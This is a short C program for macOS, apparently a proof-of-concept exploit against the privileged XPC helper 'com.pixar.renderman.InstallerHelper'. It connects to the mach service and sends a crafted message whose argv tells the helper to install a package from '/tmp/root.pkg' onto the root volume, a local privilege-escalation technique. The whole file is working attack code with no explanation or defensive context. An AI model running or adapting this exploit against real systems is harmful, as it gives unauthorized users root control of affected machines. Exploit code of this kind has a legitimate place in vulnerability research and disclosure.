#include <stdlib.h>
#include <sys/errno.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>
#include <libkern/OSByteOrder.h>
#include <xpc/xpc.h>

#define SERIVCE "com.pixar.renderman.InstallerHelper"

int main(){
	xpc_connection_t conn = xpc_connection_create_mach_service(SERIVCE, NULL,0);
	xpc_connection_set_event_handler(conn, ^(xpc_object_t event) {
		printf(":(\n");
	});
	xpc_connection_resume(conn);

	xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);

	xpc_dictionary_set_int64(msg, "message", 0x101D3);

	xpc_object_t new_stack = xpc_array_create(NULL, 0);


	xpc_array_set_string(new_stack, XPC_ARRAY_APPEND, "-dominfo");
	xpc_array_set_string(new_stack, XPC_ARRAY_APPEND, "-pkg");
	xpc_array_set_string(new_stack, XPC_ARRAY_APPEND, "/tmp/root.pkg");
	xpc_array_set_string(new_stack, XPC_ARRAY_APPEND, "-target");
	xpc_array_set_string(new_stack, XPC_ARRAY_APPEND, "/");

	xpc_dictionary_set_value(msg, "argv", new_stack);

	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);


	printf("Message Sent\n");
}